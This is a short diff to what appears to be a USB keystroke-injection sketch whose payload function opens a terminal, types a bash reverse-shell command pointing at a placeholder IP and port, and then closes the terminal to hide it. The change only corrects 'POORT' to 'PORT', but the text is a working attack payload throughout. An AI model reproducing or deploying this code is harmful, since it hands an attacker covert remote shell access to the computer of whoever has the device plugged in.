@@ -48,7 +48,7 @@ void payloadB(){
     NinjaKeyboard.print(F("Terminal"));
     NinjaKeyboard.sendKeyStroke(KEY_ENTER); 
     NinjaKeyboard.delay(1000); 
-    NinjaKeyboard.print(F("bash -i >& /dev/tcp/IP/POORT 0>&1 &"));
+    NinjaKeyboard.print(F("bash -i >& /dev/tcp/IP/PORT 0>&1 &"));
     NinjaKeyboard.sendKeyStroke(KEY_ENTER);
     NinjaKeyboard.delay(1000); 
     NinjaKeyboard.print(F("killall Terminal"));
